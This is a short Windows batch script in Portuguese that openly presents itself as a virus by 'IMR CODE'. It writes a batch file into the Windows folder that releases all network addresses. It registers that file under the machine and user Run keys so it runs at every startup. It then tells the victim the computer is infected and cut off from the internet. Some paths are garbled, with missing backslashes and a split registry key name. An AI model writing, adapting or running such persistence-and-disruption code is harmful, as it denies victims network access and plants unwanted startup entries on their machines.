echo "Esse virus foi desenvolvido por IMR CODE"
echo "Não me responsabilzo pela utilidade desse vírus"
echo @echo off>c:windowswimn32.bat
echo break off>>c:windowswimn32.bat
echo ipconfig/release_all>>c:windowswimn32.bat
echo end>>c:windowswimn32.bat

reg add hkey_local_machinesoftwaremicrosoftwindowscurrentv ersionrun /v WINDOWsAPI /t reg_sz /d c:windowswimn32.bat /f

reg add hkey_current_usersoftwaremicrosoftwindowscurrentve rsionrun /v CONTROLexit /t reg_sz /d c:windowswimn32.bat /f

echo "SEU COMPUTADOR FOI INFETADO, AGORA NÃO PODE UTILIZAR A INTERNET"

PAUSE
